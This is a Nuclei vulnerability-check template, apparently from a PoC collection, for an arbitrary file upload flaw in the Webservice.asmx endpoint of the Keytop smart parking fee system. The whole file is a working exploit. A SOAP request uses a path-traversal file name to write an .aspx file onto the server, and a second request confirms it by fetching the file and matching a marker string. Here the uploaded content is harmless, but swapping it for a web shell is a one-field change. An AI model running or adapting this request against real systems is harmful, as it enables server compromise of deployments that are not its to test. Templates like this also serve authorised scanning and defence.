pocs/nuclei/ketuo-Webservice-upload.yaml

id: ketuo-Webservice-upload
info:
  name: 科拓全智能停车收费系统Webservice.asmx存在任意文件上传
  author: apple
  severity: critical
  description: 科拓全智能停车收费系统Webservice.asmx存在任意文件上传
  reference:
    - https://github.com/wy876/POC/blob/main/%E7%A7%91%E6%8B%93%E5%85%A8%E6%99%BA%E8%83%BD%E5%81%9C%E8%BD%A6%E6%94%B6%E8%B4%B9%E7%B3%BB%E7%BB%9FWebservice.asmx%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0.md
  tags: tags
variables:
  filename: "{{rand_base(6)}}"
  
http:
  - raw:
      - |-
        POST /Webservice.asmx HTTP/1.1
        Host: {{Hostname}}
        Content-Type: text/xml; charset=utf-8
        Content-Length: 453
        SOAPAction: "http://tempuri.org/UploadResume"

        <?xml version="1.0" encoding="utf-8"?>
        <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
          <soap:Body>
            <UploadResume xmlns="http://tempuri.org/">
              <ip>1</ip>
              <fileName>../../../../{{filename}}.aspx</fileName>
              <fileFlow>d2hvaXNjZXNoaQ==</fileFlow>
              <tag>3</tag>
            </UploadResume>
          </soap:Body>
        </soap:Envelope>
      - |+
        GET /{{filename}}.aspx HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:125.0) Gecko/20100101 Firefox/125.0
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
        Accept-Encoding: gzip, deflate, br
        Connection: close
        Upgrade-Insecure-Requests: 1

    matchers:
      - type: word
        part: body
        words:
          - whoisceshi
